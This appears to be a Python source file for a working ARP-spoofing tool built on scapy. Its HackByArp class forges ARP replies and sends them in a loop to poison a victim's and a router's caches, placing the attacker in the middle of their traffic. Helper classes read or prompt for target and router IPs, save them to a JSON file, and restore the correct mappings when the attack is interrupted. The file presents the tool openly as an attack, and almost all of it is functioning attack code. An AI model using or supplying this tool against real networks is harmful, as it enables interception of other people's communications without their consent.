""" All controllers class and functions for main app """

import os
from json import load, dump
from abc import ABC, abstractmethod
from time import sleep
from scapy.all import ARP, send
import getmac


def clear_console():
    """ Simple script to clear console window """
    os.system('cls' if os.name == 'nt' else 'clear')


class AbstractController(ABC):
    """ Abstract class for controllers """
    filename = 'objects_to_attack.json'
    output = []

    @abstractmethod
    def run(self):
        """ Abstract method for controllers """


class HackByArp():
    """ Class responsible for attact victim and router """

    def __init__(self, parameters: dict = None) -> None:
        if parameters is not None:
            try:
                self.victim = parameters['victim']
                self.router = parameters['router']
                self.attacker = parameters['attacker']
            except KeyError as error:
                print(f'It isn\'t corect configuration - {error}')
        self._get_mac_addresses()

    def _get_mac_addresses(self):
        self.victim.append(getmac.get_mac_address(ip=self.victim[0]))
        self.router.append(getmac.get_mac_address(ip=self.router[0]))
        self.attacker.append(getmac.get_mac_address())

    @staticmethod
    def create_packet(victim_parameters: list, source_mac: str = None):
        """ Method to create ARP packets

        Arguments:
            victim_parameters -- list of attacked machine's parameters:
                ["authentic ip", "swapped ip", "mac address"]

        Keyword Arguments:
            source_mac -- source mac address sent in ARP message
            (default: {None} - if is None use mac of current machine)

        Returns:
           arp_packet - object class ARP (from scapy.all)
        """
        arp_packet = ARP(
            pdst=victim_parameters[0],
            hwdst=victim_parameters[2],
            psrc=victim_parameters[1],
            op='is-at'
        )
        if source_mac is not None:
            arp_packet.hsrc = source_mac

        return arp_packet

    def attack(self):
        """ Realise ManInTheMidle attack

        if except KeyboardInterrupt return default config of router and victim
        """
        victim_arp = self.create_packet(self.victim)
        router_arp = self.create_packet(self.router)
        i = 0
        while True:
            try:
                i += 1
                print(f'Starts loop no. {i}')
                send(victim_arp)
                send(router_arp)
                sleep(2)
            except KeyboardInterrupt:
                print('Hacking stopped, starts reversed setings')
                victim_arp = self.create_packet(self.victim, self.router[2])
                router_arp = self.create_packet(self.router, self.victim[2])
                for _ in range(10):
                    send(victim_arp)
                    send(router_arp)
                print('Correct settings sent.')


class ConfigurationReader(AbstractController):
    """ Read configurations from json file """

    def run(self):
        print('Start read config from "object_to_attack.json"...')
        with open(self.filename, mode='r', encoding='utf8') as input_file:
            self.output = load(input_file)

        return self.output


class ConfigurationInput(AbstractController):
    """ Input parameters from keyboard """

    def run(self):
        clear_console()
        print('\n\n\t\tInput parameters to attack. ' +
              '\nIn brackets, I write examples inputs, ' +
              'you must input your values in the same form\n\n')

        labels = ['victim', 'router']
        parameters = {}

        for name in labels:
            print(f'Input parameters for {name}')
            parameters[f'{name}'] = [input(f'{name.capitalize()} IP: (192.168.1.1)\t\t\t')]
            parameters[f'{name}'].append(input(f'Swapped {name} IP: (192.168.1.2)\t\t'))
            print('-' * 50, '\n')

        attacker_ip = input('Your IP: (192.168.1.1)\t\t\t\t')
        parameters['attacker'] = [attacker_ip, attacker_ip]

        self.output.append(parameters)

        clear_console()
        save_to_json = input('\n\nDo you want to save this config to json\'s file? [Y/n]\t')
        if save_to_json == '' or save_to_json.lower()[0] in ['y', 't']:
            choice = input('\n\nDo you want to replace [R] the contents of file ' +
                           'or append [A] to file? (press another key to cancel saving)\t')

            if choice.lower()[0] == 'a':
                try:
                    with open(self.filename, mode='r', encoding='utf8') as input_file:
                        exist_file = load(input_file)
                except FileNotFoundError:
                    exist_file = []

            else:
                exist_file = []
            print(exist_file)
            if choice.lower()[0] in ['r', 'a']:
                with open(self.filename, mode='w', encoding='utf8') as output_file:
                    to_dump = exist_file + self.output
                    dump(to_dump, output_file)

                clear_console()
                print('\n\nFile saved!')

        return self.output


class QuitProgram(AbstractController):
    """ Just quit app """

    def run(self):
        clear_console()
        print('\n\n\nSee you later :)')
